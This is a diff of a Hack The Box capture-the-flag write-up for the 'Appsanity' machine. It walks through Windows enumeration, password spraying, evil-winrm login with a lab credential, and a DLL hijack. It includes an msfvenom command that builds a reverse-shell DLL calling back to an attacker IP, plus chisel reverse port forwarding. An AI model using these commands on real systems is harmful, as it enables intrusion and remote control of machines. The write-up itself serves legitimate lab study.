@@ -130,7 +130,6 @@ appsanity\svc_exampanel
 Enumerate the system.
 ```markdown
 > systeminfo
-
 Host Name:                 APPSANITY
 OS Name:                   Microsoft Windows 10 Pro
 OS Version:                10.0.19045 N/A Build 19045
@@ -139,7 +138,6 @@ System Type:               x64-based PC
 Enumerate the system local users.
 ```markdown
 > net user
-
 User accounts for \\APPSANITY
 
 -------------------------------------------------------------------------------
@@ -166,7 +164,7 @@ After largely enumerating the file system, we find this dll:
 ```markdwon
 c:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll
 ```
-This can be decompiled the dll with dnspy, where we find several calls to a registry key `software\meddigi`
+This can be decompiled with dnspy, where we find several calls to a registry key `software\meddigi`
 
 ![appsanity9](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8543a22f-208d-49cd-a1ec-11fe4ef65bb4)
 
@@ -174,7 +172,7 @@ Next step is to query the register. You can find a password in key HKEY_LOCAL_MA
 
 ![appsanity10](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/b4918add-8efe-4b55-9c1d-d3413958529d)
 
-If you spray the password with crackmapexec you find the credentials work for user `devdoc:1g0tTh3R3m3dy!!`. Use the user list we have previously found.
+If you spray the password with crackmapexec you find the credentials work for user `devdoc:1g0tTh3R3m3dy!!`. Use the local users list we have previously enumerated.
 ```markdown
 evil-winrm -u devdoc -p '1g0tTh3R3m3dy!!' -i meddigi.htb
 ```
@@ -182,15 +180,15 @@ Turns out that under this user's context we can browse this folder.
 ```markdown
 c:\program files\reportmanagement
 ```
-Where we find the file `reportmanagement.exe`. Reversing the binary with ghidra, we find out it uses dll files placed in the folder.
+Where we find the file `reportmanagement.exe`. Reversing the binary with ghidra, we find out it uses dll files placed in the "libraries" folder.
 
 ![appsanity11](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/8b48711c-ba60-4fbf-a1e9-321520ec5b1e)
 
- So our next step is to place a malicious dll in that folder. This payload can be generatd with `msfvenom`
+ So our next step is to place a malicious dll in that folder. This payload can be generated with `msfvenom`
 ```markdown
 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.xxx.xxx lport=9001 -f dll -a x64 --platform windows > externalupload.dll
 ```
-Investigating how to launch the process, we discover the process is running locally on port 100.
+Investigating how to launch the process, we discover the it is internally running on port 100.
 ```markdown
 > netstat -ano
 
@@ -206,7 +204,7 @@ Active Connections
   TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
   TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4
 ```
-To forward this port to our attacking machine, we use chisel.
+To forward this port to our attacking machine we use chisel.
 ```markdown
 > ./chisel64 server -p 8000 --reverse
 > .\chisel64.exe client 10.10.xxx.xxx:8000 R:100:127.0.0.1:100
